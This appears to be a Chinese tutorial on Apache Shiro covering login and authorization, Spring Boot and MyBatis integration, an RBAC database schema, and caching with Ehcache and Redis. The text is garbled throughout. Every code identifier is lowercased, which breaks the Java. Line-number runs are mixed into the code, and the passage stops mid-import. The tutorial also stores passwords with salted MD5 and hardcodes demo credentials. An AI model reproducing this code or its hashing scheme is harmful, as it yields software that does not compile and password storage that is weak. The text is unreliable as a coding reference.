customerrealm.setcredentialsmatcher(hashedcredentialsmatcher);\n    \n        defaultsecuritymanager.setrealm(customerrealm);\n    \n        securityutils.setsecuritymanager(defaultsecuritymanager);\n    \n        subject subject = securityutils.getsubject();\n    \n        usernamepasswordtoken token = new usernamepasswordtoken("zhangsan", "123456");\n    \n        try {\n          subject.login(token);\n          system.out.println("登陆成功");\n        } catch (incorrectcredentialsexception e) {\n          e.printstacktrace();\n          system.out.println("密码错误");\n        }\n      }\n    }\n    \n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    29\n    30\n    31\n    32\n    33\n    34\n    35\n    36\n    37\n    38\n    39\n    40\n    41\n    42\n    43\n    \n\n\n# shiro授权\n\n> 授权，即访问控制，控制谁能访问哪些资源。主体进行身份认证后需要分配权限方可访问系统的资源，对于某些资源没有权限是无法访问的。\n\n\n# shiro 授权的关键对象\n\nwho，即主体（subject），主体需要访问系统中的资源。\n\nwhat，即资源（resource)，如系统菜单、页面、按钮、类方法、系统商品信息等。资源包括资源类型和资源实例，比如商品信息为资源类型，类型为t01的商品为资源实例，编号为001的商品信息也属于资源实例。\n\nhow，权限/许可（permission)，规定了主体对资源的操作许可，权限离开资源没有意义，如用户查询权限、用户添加权限、某个类方法的调用权限、编号为001用户的修改权限等，通过权限可知主体对哪些资源都有哪些操作许可。\n\n\n# 授权的流程\n\n\n\n\n# 授权的方式\n\n * 基于角色的访问控制\n\n * rbac基于角色的访问控制（role-based access control）是以角色为中心进行访问控制\n\nif(subject.hasrole("admin")){\n   //操作什么资源\n}\n\n\n1\n2\n3\n\n\n * 基于资源的访问控制\n   \n   * rbac基于资源的访问控制（resource-based access control）是以资源为中心进行访问控制\n   \n   if(subject.ispermission("user:update:01")){ //资源实例\n     //对01用户进行修改\n   }\n   if(subject.ispermission("user:update:*")){  //资源类型\n     //对01用户进行修改\n   }\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   \n\n\n# 权限字符串\n\n权限字符串的规则是：资源标识符：操作：资源实例标识符，意思是 对哪个资源的哪个实例具有什么操作，“:”是资源/操作/实例的分割符，权限字符串也可以使用*通配符。\n\n例子：\n\n * 用户创建权限：user:create，或user:create:*\n * 用户修改实例001的权限：user:update:001\n * 用户实例001的所有权限：user:*：001\n\n\n# 授权实现方式\n\n * 编程式\n\nsubject subject = securityutils.getsubject();\nif(subject.hasrole(“admin”)) {\n\t//有权限\n} else {\n\t//无权限\n}\n\n\n1\n2\n3\n4\n5\n6\n\n * 注解式\n\n@requiresroles("admin")\npublic void hello() {\n\t//有权限\n}\n\n\n1\n2\n3\n4\n\n * 标签式\n\njsp/gsp 标签：在jsp/gsp 页面通过相应的标签完成：\n<shiro:hasrole name="admin">\n\t<!— 有权限—>\n</shiro:hasrole>\n注意: thymeleaf 中使用shiro需要额外集成!\n\n\n1\n2\n3\n4\n5\n\n\n\n# 开发实现\n\n 1. 自定义realm\n\npackage com.pwddd.shirodemo.realm;\n\nimport org.apache.shiro.authc.authenticationexception;\nimport org.apache.shiro.authc.authenticationinfo;\nimport org.apache.shiro.authc.authenticationtoken;\nimport org.apache.shiro.authc.simpleauthenticationinfo;\nimport org.apache.shiro.authz.authorizationinfo;\nimport org.apache.shiro.authz.simpleauthorizationinfo;\nimport org.apache.shiro.realm.authorizingrealm;\nimport org.apache.shiro.subject.principalcollection;\nimport org.apache.shiro.util.bytesource;\n\npublic class customermd5realm extends authorizingrealm {\n    /**\n     * 授权\n     * @param principalcollection\n     * @return\n     */\n    @override\n    protected authorizationinfo dogetauthorizationinfo(principalcollection principalcollection) {\n\n        string principal = (string) principalcollection.getprimaryprincipal();\n        system.out.println("--------------------------------------------");\n        system.out.println("principal:"+principal);\n\n        simpleauthorizationinfo simpleauthorizationinfo = new simpleauthorizationinfo();\n        simpleauthorizationinfo.addrole("admin");\n\n        simpleauthorizationinfo.addstringpermission("user:create:*");\n        return simpleauthorizationinfo;\n    }\n\n    /**\n     * 认证\n     * @param authenticationtoken\n     * @return\n     * @throws authenticationexception\n     */\n    @override\n    protected authenticationinfo dogetauthenticationinfo(authenticationtoken authenticationtoken) throws authenticationexception {\n\n        string principal = (string) authenticationtoken.getprincipal();\n\n        if ("zhangsan".equals(principal)){\n\n            authenticationinfo authenticationinfo = new simpleauthenticationinfo(\n                    principal,\n                    "a991e133559f1891893b60a3c04e8740",\n                    bytesource.util.bytes("123/bmk#"),\n                    this.getname()\n            );\n            return authenticationinfo;\n\n        }\n        return null;\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n\n 2. 授权测试代码\n\npackage com.pwddd.shirodemo;\n\nimport com.pwddd.shirodemo.realm.customermd5realm;\nimport org.apache.shiro.securityutils;\nimport org.apache.shiro.authc.authenticationexception;\nimport org.apache.shiro.authc.incorrectcredentialsexception;\nimport org.apache.shiro.authc.unknownaccountexception;\nimport org.apache.shiro.authc.usernamepasswordtoken;\nimport org.apache.shiro.authc.credential.hashedcredentialsmatcher;\nimport org.apache.shiro.mgt.defaultsecuritymanager;\nimport org.apache.shiro.subject.subject;\n\npublic class testcustomermd5realm {\n    public static void main(string[] args) {\n\n        defaultsecuritymanager defaultsecuritymanager = new defaultsecuritymanager();\n        customermd5realm customermd5realm = new customermd5realm();\n\n        hashedcredentialsmatcher hashedcredentialsmatcher = new hashedcredentialsmatcher();\n        hashedcredentialsmatcher.sethashalgorithmname("md5");\n        hashedcredentialsmatcher.sethashiterations(1024);\n\n        customermd5realm.setcredentialsmatcher(hashedcredentialsmatcher);\n        defaultsecuritymanager.setrealm(customermd5realm);\n\n        securityutils.setsecuritymanager(defaultsecuritymanager);\n\n        subject subject = securityutils.getsubject();\n\n        usernamepasswordtoken token = new usernamepasswordtoken("zhangsan", "123456");\n\n        try {\n            subject.login(token);\n            system.out.println("认证成功");\n            system.out.println(subject.hasrole("admin"));\n            system.out.println(subject.ispermitted("user:create:01"));\n        } catch (unknownaccountexception e) {\n//            e.printstacktrace();\n            system.out.println("用户名不存在");\n        } catch (incorrectcredentialsexception e){\n            system.out.println("密码错误");\n        }\n\n\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\n\n# 整合springboot\n\n\n# 整合的思路\n\n\n\n\n# 整合的步骤\n\n# 0. 创建springboot项目\n\n\n\n# 1. 引入相关依赖\n\n<?xml version="1.0" encoding="utf-8"?>\n<project xmlns="http://maven.apache.org/pom/4.0.0"\n         xmlns:xsi="http://www.w3.org/2001/xmlschema-instance"\n         xsi:schemalocation="http://maven.apache.org/pom/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">\n    <modelversion>4.0.0</modelversion>\n\n    <groupid>com.pwddd</groupid>\n    <artifactid>springboot_jsp_shiro</artifactid>\n    <version>1.0-snapshot</version>\n\n    <parent>\n        <groupid>org.springframework.boot</groupid>\n        <artifactid>spring-boot-parent</artifactid>\n        <version>2.6.4</version>\n    </parent>\n    <properties>\n        <maven.compiler.source>8</maven.compiler.source>\n        <maven.compiler.target>8</maven.compiler.target>\n    </properties>\n\n    <dependencies>\n        <dependency>\n            <groupid>org.springframework.boot</groupid>\n            <artifactid>spring-boot-starter-web</artifactid>\n        </dependency>\n\n        <dependency>\n            <groupid>org.springframework.boot</groupid>\n            <artifactid>spring-boot-starter-test</artifactid>\n            <scope>test</scope>\n        </dependency>\n\n        <dependency>\n            <groupid>org.projectlombok</groupid>\n            <artifactid>lombok</artifactid>\n            <version>1.18.2</version>\n            <optional>true</optional>\n        </dependency>\n\n        <dependency>\n            <groupid>org.apache.tomcat.embed</groupid>\n            <artifactid>tomcat-embed-jasper</artifactid>\n        </dependency>\n\n        <dependency>\n            <groupid>jstl</groupid>\n            <artifactid>jstl</artifactid>\n            <version>1.2</version>\n        </dependency>\n\n    </dependencies>\n\n</project>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n\n\n引入shiro整合springboot\n\n<dependency>\n  <groupid>org.apache.shiro</groupid>\n  <artifactid>shiro-spring-boot-starter</artifactid>\n  <version>1.5.3</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\n# 2. 配置spring boot项目\n\n配置springboot配置文件\n\nserver.port=8888\nserver.servlet.context-path=/shiro\nspring.mvc.view.prefix=/\nspring.mvc.view.suffix=.jsp\n\n\n1\n2\n3\n4\n\n\n配置工作目录\n\n\n\n# 3. 配置shiro环境\n\n# 0. 创建配置类\n\npackage com.pwddd.shiro.config;\n\nimport com.pwddd.shiro.realm.customerrealm;\nimport org.apache.shiro.realm.realm;\nimport org.apache.shiro.spring.web.shirofilterfactorybean;\nimport org.apache.shiro.web.mgt.defaultwebsecuritymanager;\nimport org.springframework.context.annotation.bean;\nimport org.springframework.context.annotation.configuration;\n\nimport java.util.hashmap;\nimport java.util.map;\n\n/**\n * 用于整合shiro的配置类\n */\n@configuration\npublic class shiroconfig {\n    //1. 创建shiro filter\n    @bean\n    public shirofilterfactorybean getshirofilterfactorybean(defaultwebsecuritymanager defaultwebsecuritymanager){\n        shirofilterfactorybean factorybean = new shirofilterfactorybean();\n        factorybean.setsecuritymanager(defaultwebsecuritymanager);\n\n        // 配置系统的受限资源和公共资源\n        map<string,string> map = new hashmap<>();\n        map.put("/login.jsp","anon");\n        map.put("/user/login","anon");\n        map.put("/**","authc");\n\n        // 默认的认证界面 login.jsp\n        factorybean.setloginurl("/login.jsp");\n\n        factorybean.setfilterchaindefinitionmap(map);\n        return factorybean;\n\n\n    }\n    //2. 创建安全管理器\n    @bean\n    public defaultwebsecuritymanager defaultwebsecuritymanager(authorizingrealm realm){\n        defaultwebsecuritymanager defaultwebsecuritymanager = new defaultwebsecuritymanager();\n        defaultwebsecuritymanager.setrealm(realm);\n        return defaultwebsecuritymanager;\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n\n\n# 1. 创建自定义realm\n\npackage com.pwddd.shiro.realm;\n\nimport org.apache.shiro.authc.authenticationexception;\nimport org.apache.shiro.authc.authenticationinfo;\nimport org.apache.shiro.authc.authenticationtoken;\nimport org.apache.shiro.authc.simpleauthenticationinfo;\nimport org.apache.shiro.authz.authorizationinfo;\nimport org.apache.shiro.realm.authorizingrealm;\nimport org.apache.shiro.subject.principalcollection;\n\npublic class customerrealm extends authorizingrealm {\n    @override\n    protected authorizationinfo dogetauthorizationinfo(principalcollection principalcollection) {\n        return null;\n    }\n\n    @override\n    protected authenticationinfo dogetauthenticationinfo(authenticationtoken authenticationtoken) throws authenticationexception {\n        system.out.println("====================================");\n        string principal = (string) authenticationtoken.getprincipal();\n\n        if ("zhangsan".equals(principal)){\n\n            simpleauthenticationinfo authenticationinfo = new simpleauthenticationinfo(\n                    principal,\n                    "123456",\n                    this.getname()\n            );\n            return authenticationinfo;\n        }\n        return null;\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n# 2. 配置页面跳转\n\npackage com.pwddd.shiro.controller;\n\nimport org.apache.shiro.securityutils;\nimport org.apache.shiro.authc.authenticationexception;\nimport org.apache.shiro.authc.incorrectcredentialsexception;\nimport org.apache.shiro.authc.unknownaccountexception;\nimport org.apache.shiro.authc.usernamepasswordtoken;\nimport org.apache.shiro.subject.subject;\nimport org.springframework.stereotype.controller;\nimport org.springframework.web.bind.annotation.getmapping;\nimport org.springframework.web.bind.annotation.postmapping;\nimport org.springframework.web.bind.annotation.requestmapping;\n\n@controller\n@requestmapping("user")\npublic class usercontroller {\n\n    @postmapping("login")\n    public string login(string username,string password){\n\n        subject subject = securityutils.getsubject();\n\n        try {\n            subject.login(new usernamepasswordtoken(username,password));\n            return "redirect:/index.jsp";\n        } catch (unknownaccountexception e) {\n//            e.printstacktrace();\n            system.out.println("用户名错误");\n        } catch (incorrectcredentialsexception e){\n            system.out.println("密码错误");\n        }\n\n        return "redirect:/login.jsp";\n    }\n    @getmapping("logout")\n    public string logout(){\n        subject subject = securityutils.getsubject();\n        subject.logout();\n        return "redirect:/login.jsp";\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n\n\n注意:\n\n默认在配置好shiro环境后默认环境中没有对项目中任何资源进行权限控制,所有现在项目中所有资源都可以通过路径访问\n\n# 4. 常见过滤器\n\n注意: shiro提供和多个默认的过滤器，我们可以用这些过滤器来配置控制指定url的权限：\n\n配置缩写                对应的过滤器                           功能\nanon                anonymousfilter                  指定url可以匿名访问\nauthc               formauthenticationfilter         指定url需要form表单登录，默认会从请求中获取username、password,rememberme等参数并尝试登录，如果登录不了就会跳转到loginurl配置的路径。我们也可以用这个过滤器做默认的登录逻辑，但是一般都是我们自己在控制器写登录逻辑的，自己写的话出错返回的信息都可以定制嘛。\nauthcbasic          basichttpauthenticationfilter    指定url需要basic登录\nlogout              logoutfilter                     登出过滤器，配置指定url就可以实现退出功能，非常方便\nnosessioncreation   nosessioncreationfilter          禁止创建会话\nperms               permissionsauthorizationfilter   需要指定权限才能访问\nport                portfilter                       需要指定端口才能访问\nrest                httpmethodpermissionfilter       将http请求方法转化成相应的动词来构造一个权限字符串，这个感觉意义不大，有兴趣自己看源码的注释\nroles               rolesauthorizationfilter         需要指定角色才能访问\nssl                 sslfilter                        需要https请求才能访问\nuser                userfilter                       需要已登录或“记住我”的用户才能访问\n\n# 5. 认证的实现\n\n# 1. login.jsp开发认证界面\n\n<%--\n  created by intellij idea.\n  user: plankton\n  date: 2022/3/28\n  time: 20:26\n  to change this template use file | settings | file templates.\n--%>\n<%@ page contenttype="text/html;charset=utf-8" language="java" %>\n<html>\n  <head>\n    <title>登录</title>\n  </head>\n  <body>\n    <h1>登录</h1>\n    <form action="${pagecontext.request.contextpath}/user/login" method="post">\n      用户名：<input type="text" name="username" > <br>\n      密码 ：<input type="password" name="password"> <br>\n      <input type="submit" name="提交">\n    </form>\n  </body>\n</html>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\n# 2. index页面\n\n<%--\n  created by intellij idea.\n  user: plankton\n  date: 2022/3/28\n  time: 20:26\n  to change this template use file | settings | file templates.\n--%>\n<%@ page contenttype="text/html;charset=utf-8" language="java" %>\n<html>\n  <head>\n    <title>首页</title>\n  </head>\n  <body>\n    <h1>首页</h1>\n    <a href="${pagecontext.request.contextpath}/user/logout">退出登陆</a> <br>\n    <ul>\n      <li><a href="#">用户管理</a></li>\n      <li><a href="#">商品管理</a></li>\n      <li><a href="#">订单管理</a></li>\n      <li><a href="#">物流管理</a></li>\n    </ul>\n  </body>\n</html>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n# 7. md5和salt认证的实现\n\n# 0. 实现注册\n\n注册页面：\n\n<%@ page contenttype="text/html;charset=utf-8" language="java" %>\n<html>\n<head>\n    <title>注册</title>\n</head>\n<body>\n<h1>注册</h1>\n<form action="${pagecontext.request.contextpath}/user/register" method="post">\n    用户名：<input type="text" name="username" > <br>\n    密码 ：<input type="password" name="password"> <br>\n    <input type="submit" name="提交">\n</form>\n</body>\n</html>\n\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n# 1. 引入数据库\n\n相关依赖\n\n<dependency>\n  <groupid>org.mybatis.spring.boot</groupid>\n  <artifactid>mybatis-spring-boot-starter</artifactid>\n  <version>2.2.2</version>\n</dependency>\n\n<dependency>\n  <groupid>mysql</groupid>\n  <artifactid>mysql-connector-java</artifactid>\n  <version>8.0.28</version>\n</dependency>\n\n<dependency>\n  <groupid>com.alibaba</groupid>\n  <artifactid>druid</artifactid>\n  <version>1.2.8</version>\n</dependency>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n配置\n\n# 数据源\nspring.datasource.driver-class-name=com.mysql.cj.jdbc.driver\nspring.datasource.type=com.alibaba.druid.pool.druiddatasource\nspring.datasource.url=jdbc:mysql://localhost:3306/shirodemo?characterencoding=utf8\nspring.datasource.username=root\nspring.datasource.password=123456\n\n\n1\n2\n3\n4\n5\n6\n\n\n创建entity\n\npackage com.pwddd.shirojsp.entity;\n\nimport lombok.allargsconstructor;\nimport lombok.data;\nimport lombok.noargsconstructor;\nimport lombok.experimental.accessors;\n\n@data\n@accessors(chain = true)\n@noargsconstructor\n@allargsconstructor\npublic class user {\n    private string id;\n    private string username;\n    private string password;\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n编写mapper文件\n\n<?xml version="1.0" encoding="utf-8" ?>\n<!doctype mapper\n        public "-//mybatis.org//dtd mapper 3.0//en"\n        "http://mybatis.org/dtd/mybatis-3-mapper.dtd">\n\x3c!--名称空间和查询中的名称空间一致--\x3e\n<mapper namespace="com.pwddd.shirojsp.mapper.usermapper">\n\n    <insert id="save" parametertype="com.pwddd.shirojsp.entity.user">\n        insert into t_user values(#{id},#{username},#{password})\n    </insert>\n</mapper>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n配置mybatis\n\n# mybatis\nmybatis.type-aliases-package=com.pwddd.shirojsp.entity\nmybatis.mapper-locations=classpath:mapper/*.xml\n\n\n1\n2\n3\n\n\n创建service层\n\npackage com.pwddd.shirojsp.service.impl;\n\nimport com.pwddd.shirojsp.entity.user;\nimport com.pwddd.shirojsp.mapper.usermapper;\nimport com.pwddd.shirojsp.service.userservice;\nimport org.apache.shiro.crypto.hash.md5hash;\nimport org.springframework.beans.factory.annotation.autowired;\nimport org.springframework.stereotype.service;\n\nimport java.util.uuid;\n\n@service("userserviceimpl")\npublic class userserviceimpl implements userservice {\n\n    @autowired\n    private usermapper usermapper;\n\n    @override\n    public void register(user user) {\n        string uuid = uuid.randomuuid().tostring();\n        uuid = uuid.replace("-","");\n        user.setid(uuid);\n        md5hash md5hash = new md5hash(user.getpassword(), uuid, 1024);\n        user.setpassword(md5hash.tohex());\n        usermapper.save(user);\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n编写controller层\n\n@postmapping("register")\npublic string register(user user){\n  userservice.register(user);\n  return "redirect:/login.jsp";\n}\n\n\n1\n2\n3\n4\n5\n\n\n# 3. 认证实现\n\n数据库查询用户信息\n\n @override\n    protected authenticationinfo dogetauthenticationinfo(authenticationtoken authenticationtoken) throws authenticationexception {\n        system.out.println("====================================");\n        string principal = (string) authenticationtoken.getprincipal();\n\n        // 1. 利用名字去查询数据库\n        user user = userservice.getuser(principal);\n        if (user != null){\n            return new simpleauthenticationinfo(\n                    user.getusername(),\n                    user.getpassword(),\n                    bytesource.util.bytes(user.getid()),\n                    this.getname()\n            );\n        }\n        return null;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n设置加密算法和散列次数\n\n//2. 创建安全管理器\n@bean\npublic defaultwebsecuritymanager defaultwebsecuritymanager(authorizingrealm realm){\n  defaultwebsecuritymanager defaultwebsecuritymanager = new defaultwebsecuritymanager();\n\n  hashedcredentialsmatcher credentialsmatcher = new hashedcredentialsmatcher();\n  credentialsmatcher.sethashalgorithmname("md5");\n  credentialsmatcher.sethashiterations(1024);\n  realm.setcredentialsmatcher(credentialsmatcher);\n\n  defaultwebsecuritymanager.setrealm(realm);\n  return defaultwebsecuritymanager;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# 8. 授权的实现\n\n# 0. 授权页面\n\n<%@ taglib prefix="shiro" uri="http://shiro.apache.org/tags" %>\n<%--\n  created by intellij idea.\n  user: plankton\n  date: 2022/3/28\n  time: 20:26\n  to change this template use file | settings | file templates.\n--%>\n<%@ page contenttype="text/html;charset=utf-8" language="java" %>\n<html>\n<head>\n    <title>首页</title>\n</head>\n<body>\n<h1>首页</h1>\n<a href="${pagecontext.request.contextpath}/user/logout">退出登陆</a> <br>\n<ul>\n    <shiro:hasanyroles name="admin" >\n        \n        <shiro:hasanyroles name="user">\n            <li><a href="#">用户管理</a></li>\n        </shiro:hasanyroles>\n        \n        <shiro:hasanyroles name="order">\n            <li><a href="#">商品管理</a></li>\n            <li><a href="#">订单管理</a></li>\n            <li><a href="#">物流管理</a></li>\n        </shiro:hasanyroles>\n        \n    </shiro:hasanyroles>\n</ul>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n# 1. 测试代码\n\n@override\nprotected authorizationinfo dogetauthorizationinfo(principalcollection principalcollection) {\n  string principal = (string) principalcollection.getprimaryprincipal();\n  if ("admin".equals(principal)){\n    simpleauthorizationinfo authorizationinfo = new simpleauthorizationinfo();\n    authorizationinfo.addroles(arrays.aslist("admin","user"));\n    return authorizationinfo;\n  }\n  return null;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n# 2. 方法调用中的权限控制\n\n@requestmapping("delete/{username}")\n@responsebody\n@requiresroles(value = {"admin","user"})\npublic string deleteuser(@pathparam("username")string username){\n    userservice.deleteuser(username);\n    return "success";\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n# 3. 授权数据持久化\n\n通常情况下，我们的授权信息存储到数据库中，我们这里使用一个用户对应多个角色，角色对应权限的rbac模型进行设计。如下图所示：\n\n\n\n创建对应的表：\n\ndrop table if exists t_role;\ncreate table if not exists t_role\n(\n    rid   varchar(100) not null,\n    rname varchar(200) not null,\n    primary key (rid)\n);\n\ninsert into t_role\nvalues (\'1\', \'admin\'),\n       (\'2\', \'user\'),\n       (\'3\', \'order\');\n\ndrop table if exists t_permission;\ncreate table if not exists t_permission\n(\n    pid   varchar(100) not null,\n    pname varchar(200) not null,\n    url   varchar(200) not null,\n    primary key (pid)\n);\n\ninsert into t_permission\nvalues (\'1\', \'user:*:*\', \'/user/*\'),\n       (\'2\', \'order:*:*\', \'/order/*\'),\n       (\'3\', \'user:delete:*\', \'/user/delete/\');\n\n\ndrop table if exists t_user_role;\ncreate table if not exists t_user_role\n(\n    id  varchar(100) not null,\n    uid varchar(100) not null,\n    rid varchar(100) not null,\n    primary key (id)\n);\n\ninsert into t_user_role\nvalues (\'1\', \'826975e8649341c1b6af743e4f9923f2\', \'1\'),\n       (\'2\', \'826975e8649341c1b6af743e4f9923f2\', \'2\'), -- admin all\n       (\'3\', \'826975e8649341c1b6af743e4f9923f2\', \'3\'),\n       (\'4\', \'00b6c77cb7c048e9a6a8858a600cc206\', \'3\'); -- lisi order\n\ndrop table if exists t_role_permission;\ncreate table t_role_permission\n(\n    id  varchar(100) not null,\n    rid varchar(100) not null,\n    pid varchar(100) not null,\n    primary key (id)\n);\n\ninsert into t_role_permission\nvalues (\'1\', \'1\', \'1\'),\n       (\'2\', \'1\', \'2\'),\n       (\'3\', \'1\', \'3\'),\n       (\'4\', \'2\', \'1\'),\n       (\'5\', \'2\', \'3\'),\n       (\'6\', \'3\', \'2\'),\n       (\'7\', \'3\', \'2\');\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n\n\n编写实体类：\n\npackage com.pwddd.shirojsp.entity;\n\nimport lombok.allargsconstructor;\nimport lombok.data;\nimport lombok.noargsconstructor;\nimport lombok.experimental.accessors;\n\nimport java.util.list;\n\n@data\n@accessors(chain = true)\n@noargsconstructor\n@allargsconstructor\npublic class role {\n    \n    private string id;\n    private string rid;\n    private string rname;\n    \n    private list<perm> perms;\n    \n}\n\n\npackage com.pwddd.shirojsp.entity;\n\nimport lombok.allargsconstructor;\nimport lombok.data;\nimport lombok.noargsconstructor;\nimport lombok.experimental.accessors;\n\n@data\n@accessors(chain = true)\n@noargsconstructor\n@allargsconstructor\npublic class perm {\n\n    private string id;\n    private string pid;\n    private string pname;\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n\n\n查询用户时就查所有的用户权限和身份信息：\n\n<resultmap id="usermap" type="user">\n  <id column="id" property="id" />\n  <result column="username" property="username" />\n  <result column="password" property="password" />\n  <collection property="roles" oftype="role" >\n    <id column="role_id" property="rid" />\n    <result column="role_name" property="rname" />\n    <collection property="perms" oftype="perm">\n      <id column="perm_id" property="pid" />\n      <result column="perm_name" property="pname" />\n      <result column="perm_url" property="purl" />\n    </collection>\n  </collection>\n</resultmap>\n<select id="selectuser" resultmap="usermap">\n  select u.id, u.username, u.password, r.rid role_id, r.rname role_name,tp.pid perm_id,tp.pname perm_name,tp.url perm_url\n  from t_user u\n  left join t_user_role ur on u.id = ur.uid\n  left join t_role r on ur.rid = r.rid\n  left join t_role_permission trp on r.rid = trp.rid\n  left join t_permission tp on trp.pid = tp.pid\n  where username = #{username}\n</select>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n设置权限信息：\n\n    @override\n    protected authorizationinfo dogetauthorizationinfo(principalcollection principalcollection) {\n        string principal = (string) principalcollection.getprimaryprincipal();\n\n        // 根据principal查询对应的用户组\n        user user = userservice.getuser(principal);\n        if (user != null){\n            simpleauthorizationinfo authorizationinfo = new simpleauthorizationinfo();\n            for (role role :\n                    user.getroles()) {\n                authorizationinfo.addrole(role.getrname());\n                for (perm perm : role.getperms()){\n                    authorizationinfo.addstringpermission(perm.getpname());\n                }\n            }\n            return authorizationinfo;\n        }\n\n        return null;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n# 9. 使用cachemanager\n\n# 0. ehcache\n\n引入依赖\n\n<dependency>\n  <groupid>org.apache.shiro</groupid>\n  <artifactid>shiro-ehcache</artifactid>\n  <version>1.5.3</version>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\n开启缓存\n\n//2. 创建安全管理器\n@bean\npublic defaultwebsecuritymanager defaultwebsecuritymanager(authorizingrealm realm){\n\n  defaultwebsecuritymanager defaultwebsecuritymanager = new defaultwebsecuritymanager();\n\n  hashedcredentialsmatcher credentialsmatcher = new hashedcredentialsmatcher();\n  credentialsmatcher.sethashalgorithmname("md5");\n  credentialsmatcher.sethashiterations(1024);\n  realm.setcredentialsmatcher(credentialsmatcher);\n  realm.setcachemanager(new ehcachemanager());\n  realm.setcachingenabled(true);\n  realm.setauthorizationcachingenabled(true);\n  realm.setauthenticationcachingenabled(true);\n  defaultwebsecuritymanager.setrealm(realm);\n  return defaultwebsecuritymanager;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n# 1. redis\n\n引入redis依赖：\n\n\x3c!--redis整合springboot--\x3e\n<dependency>\n  <groupid>org.springframework.boot</groupid>\n  <artifactid>spring-boot-starter-data-redis</artifactid>\n</dependency>\n\n\n1\n2\n3\n4\n5\n\n\n配置连接：\n\n# redis\nspring.redis.database=0\nspring.redis.host=localhost\nspring.redis.port=6379\n\n\n1\n2\n3\n4\n\n\n配置rediscachemanager\n\npackage com.pwddd.shirojsp.cache;\n\nimport org.apache.shiro.cache.cache;\nimport org.apache.shiro.cache.cacheexception;\nimport org.apache.shiro.cache.cachemanager;\nimport org.springframework.beans.factory.annotation.autowired;\nimport org.springframework.boot.autoconfigure.cache.cacheproperties;\nimport org.springframework.data.redis.core.redistemplate;\nimport 